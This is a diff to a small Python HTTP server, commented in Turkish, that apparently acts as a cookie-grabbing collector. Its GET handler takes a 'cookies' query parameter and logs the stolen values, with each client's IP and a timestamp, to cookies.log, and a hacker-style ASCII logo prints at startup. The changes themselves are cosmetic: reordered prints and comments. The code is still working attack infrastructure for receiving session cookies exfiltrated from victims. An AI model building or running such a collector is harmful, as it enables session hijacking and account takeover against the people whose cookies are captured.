@@ -11,23 +11,22 @@ class RequestHandler(BaseHTTPRequestHandler):
     def do_GET(self):
         """Gelen GET isteklerini işler"""
         try:
+            # İstek yapılan URL'yi ve parametreleri ayrıştırma
             parsed_url = urllib.parse.urlparse(self.path)
             query_params = urllib.parse.parse_qs(parsed_url.query)
 
+            # İstek bilgilerini ve kullanıcı IP adresini yazdırma
+            client_ip = self.client_address[0]
             print("\n---- GET Request ----")
+            print(f"Client IP: \033[34m{client_ip}\033[0m")
             print(f"Path: \033[32m{self.path}\033[0m")
             print(f"Headers:\n{self.headers}")
             print(f"Query Parameters: \033[31m{query_params}\033[0m")
 
-            # İstemcinin IP adresini al
-            client_ip = self.client_address[0]
-            print(f"Client IP: {client_ip}")
-
-            # Çerez verilerini kontrol etme ve kaydetme
+            # Çerez verilerini kontrol etme ve log dosyasına kaydetme
             cookies = query_params.get('cookies', [])
             if cookies:
                 print(f"Received Cookies: {cookies}")
-                # Çerez verilerini ve IP adresini log dosyasına kaydetme
                 with open("cookies.log", "a") as log_file:
                     log_file.write(f"{time.ctime()} - IP: {client_ip} - Cookies: {cookies}\n")
 
@@ -45,6 +44,7 @@ class RequestHandler(BaseHTTPRequestHandler):
             self.wfile.write(b"Internal Server Error")
 
 def home_logo():
+    """Sunucu başlatıldığında konsola bir logo basar"""
     print("""
         ############   #########   ##       ##    ########                     
                  ##    ##          ##       ##   ##
